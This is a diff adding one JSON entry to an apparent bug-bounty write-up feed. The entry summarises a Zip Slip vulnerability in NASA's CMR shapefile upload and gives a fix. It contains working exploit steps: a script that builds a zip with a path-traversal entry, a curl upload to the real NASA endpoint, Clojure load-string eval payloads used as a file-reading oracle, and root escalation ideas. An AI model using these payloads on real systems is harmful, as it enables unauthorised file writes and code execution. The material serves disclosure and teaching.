@@ -1,5 +1,45 @@
 [
   {
+    "id": "d9f70827b2c2",
+    "title": "I Wrote a File on a NASA Server With a 132-Byte Zip",
+    "url": "https://obaskly.medium.com/i-wrote-a-file-on-a-nasa-server-with-a-132-byte-zip-41615320b5a5",
+    "source": {
+      "slug": "medium-tag-bug-bounty",
+      "name": "Medium — #bug-bounty"
+    },
+    "authors": [
+      "Obaskly"
+    ],
+    "program": null,
+    "platform_slug": "self-disclosed",
+    "bounty_raw": null,
+    "published_at": "2026-10-27T05:35:27.000Z",
+    "added_at": "2026-10-27T05:41:09.590Z",
+    "categories": [
+      "file-upload"
+    ],
+    "severity": "high",
+    "difficulty": "intermediate",
+    "summary_en": "A Zip Slip vulnerability in NASA’s CMR shapefile upload lets an attacker write arbitrary files outside the intended temporary directory, potentially leading to full system compromise because the service runs as root.",
+    "summary_ar": null,
+    "lesson": {
+      "cause": "The unzip function in shapefile.clj creates a temporary directory, then iterates over each entry in the uploaded zip and writes the entry to a path built by concatenating the entry name onto the temp directory path. No validation is performed on the entry name, and Java’s File class does not reject \"..\" sequences, so a crafted entry like \"../poc.txt\" resolves to /tmp/poc.txt. Because the code extracts files before any later validation (the missing .shp check), the malicious file is written to disk even though the request later fails with a 400 error.",
+      "walkthrough": "RECON\nStep 1: The researcher opened the source file _search-app/src/cmr/search/services/parameters/converters/shapefile.clj_ to locate the unzip logic.\nCode:\n(defn unzip-file\n [source]\n (let [target-dir (Files/createTempDirectory \"Shapes\" (into-array FileAttribute []))]\n   (with-open [zip (ZipFile. source)]\n     (let [entries (enumeration-seq (.entries zip))\n           target-file #(File. (.toString target-dir) (str %))]\n       (doseq [entry entries :when (not (.isDirectory ^java.util.zip.ZipEntry entry))\n               :let [f (target-file entry)]]\n         (io/copy (.getInputStream zip entry) f))))\n   (.toFile target-dir)))\nWhy: This Clojure function (a function definition) shows that each zip entry’s name is directly turned into a file path (target-file) without any checks.\n\nDISCOVERY\nStep 2: Noticing that Java’s File does not block \"..\" (parent‑directory) components, the researcher realized a Zip Slip (path‑traversal via zip) is possible.\nWhy: \"..\" tells the filesystem to move up one directory; when concatenated it can escape the intended folder.\n\nEXPLOITATION\nStep 3: Create a malicious zip containing a file named \"../poc.txt\" with the desired content.\nCode (Python 3):\nimport zipfile\nwith zipfile.ZipFile(\"evil.zip\", \"w\") as zf:\n    zf.writestr(\"../poc.txt\", \"poc by obaskly\")\nWhy: zipfile.Writestr writes a new entry; the name \"../poc.txt\" includes the parent‑directory traversal.\nStep 4: Upload the zip to the public search endpoint using curl.\nCode:\ncurl -X POST \"https://cmr.earthdata.nasa.gov/search/collections.json\" \\\n -F \"shapefile=@evil.zip;type=application/shapefile+zip\" \\\n -F \"include_facets=v2\" \\\n -F \"page_size=1\"\nWhy: -X POST sets HTTP method to POST; -F sends multipart form fields; \"shapefile=@evil.zip\" attaches the crafted zip.\nStep 5: Observe the server returns HTTP 400 with “Incomplete shapefile: missing .shp file”. The extraction already happened before the validation, so the file is on disk.\nWhy: The code extracts all entries first, then checks for a .shp file; the error does not undo the earlier write.\n\nVERIFICATION\nStep 6: Use a previously discovered RCE vector (facets_size parameter) that evaluates Clojure code via #=(...). Check if the file exists.\nCode:\n#=(load-string \"(if (.exists (java.io.File. \\\"/tmp/poc.txt\\\")) 1 -1)\")\nWhy: load-string evaluates the string as Clojure code; .exists returns true if the file is present, causing the server to reply 200.\nStep 7: Read the file’s first character by binary‑searching its ASCII code.\nCode:\n#=(load-string \"(- (int (nth (slurp \\\"/tmp/poc.txt\\\") 0)) 63)\")\nWhy: slurp reads the file, nth gets the first byte, int converts to its numeric code, subtracting 63 yields a value that the server’s response (200/400) indicates whether the guess is high or low.\nStep 8: Repeat for each character (≈7 requests per byte) until the full content \"poc by obaskly\" is recovered.\nWhy: Each request acts as an oracle, revealing one character at a time.\n\nIMPACT\nStep 9: Because the CMR service runs as root, any path can be written – overwriting JARs, adding cron jobs, or modifying system files, leading to remote code execution or container escape if Docker socket is mounted.\nWhy: Root privileges give unrestricted file‑system access.",
+      "example": "**Fictional vulnerable service (target.example)**\n```python\n# vulnerable Flask app (illustrative only)\nfrom flask import Flask, request\nimport zipfile, os, tempfile\napp = Flask(__name__)\n\n@app.route('/upload', methods=['POST'])\ndef upload():\n    z = zipfile.ZipFile(request.files['file'])\n    tmp = tempfile.mkdtemp(prefix='upload_')\n    for name in z.namelist():\n        # vulnerable: directly join name to temp dir\n        dest = os.path.join(tmp, name)\n        with open(dest, 'wb') as f:\n            f.write(z.read(name))\n    return 'ok'\n```\n**Attack**\nCreate zip with entry \"../evil.txt\" containing \"owned\" and POST it:\n```bash\npython - <<'PY'\nimport zipfile, sys\nzf = zipfile.ZipFile('evil.zip','w')\nzf.writestr('../evil.txt','owned')\nzf.close()\nPY\ncurl -F \"file=@evil.zip\" http://target.example/upload\n```\n**Why it works**: The server joins the entry name to the temporary directory without sanitising \"..\". The filesystem resolves \"../evil.txt\" to a location outside the temp folder, writing the file wherever the process has permission.",
+      "takeaway": "When a service accepts archive uploads, always look for Zip Slip: check how entry names are handled after extraction. A 400 Bad Request does not guarantee the server didn’t perform actions—inspect side‑effects before the error. Re‑using an existing bug (like an RCE oracle) can turn a theoretical write‑out into a provable exploit. Variants include tar‑ball extraction, 7z, or any library that concatenates untrusted paths. Beginners often forget to verify that the file write occurs before validation, leading them to dismiss successful writes as false positives.",
+      "fix": "Validate each zip entry’s canonical path before writing. Resolve the entry to an absolute path and ensure it starts with the intended extraction directory. Example fix (from the report):\n```clojure\n(let [canonical (.getCanonicalPath (File. (.toString target-dir) (str entry)))]\n  (when-not (.startsWith canonical (.getCanonicalPath (.toFile target-dir)))\n    (throw (Exception. \"Zip entry attempts path traversal\"))))\n```\nThis code obtains the real filesystem path (canonical) of the target file and aborts if it lies outside the temporary directory. Additionally, running the service with least‑privilege (non‑root) limits the damage even if an attacker writes files.",
+      "cause_ar": null,
+      "walkthrough_ar": null,
+      "example_ar": null,
+      "takeaway_ar": null,
+      "fix_ar": null
+    },
+    "excerpt": "NASA’s Common Metadata Repository (CMR) at cmr.earthdata.nasa.gov is the search backend for Earthdata. It’s open source, so I spent my time reading code instead of guessing. One feature stood out. You can search by uploading a shapefile, and shapefiles usually come as a zip. So the server takes a zip from anyone on the internet and extracts it. Naturally I wanted to see how. **THE BUG** The extraction code is in _search-app/src/cmr/search/services/parameters/converters/shapefile.clj_: (defn unzip-file [source] (let [target-dir (Files/createTempDirectory \"Shapes\" (into-array FileAttribute []))]",
+    "ai_generated": true,
+    "engagement": null,
+    "score": 53
+  },
+  {
     "id": "a49310f702bd",
     "title": "One File, Zero Clicks Needed: A Stored DoS Story",
     "url": "https://medium.com/@devyanipardesh7010/one-file-zero-clicks-needed-a-stored-dos-story-68725c5703c3",
